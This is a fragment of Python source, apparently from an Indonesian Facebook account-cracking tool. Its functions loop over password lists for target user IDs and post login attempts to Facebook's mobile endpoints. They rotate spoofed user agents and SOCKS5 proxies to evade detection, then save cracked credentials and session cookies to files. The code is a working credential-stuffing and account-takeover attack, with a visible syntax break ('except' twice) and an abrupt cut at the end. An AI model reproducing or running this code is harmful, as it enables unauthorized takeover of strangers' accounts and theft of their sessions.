				"next":f"https://{link_okep}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			kuko += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://"+link_okep,
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mbasic(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1

def api(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		
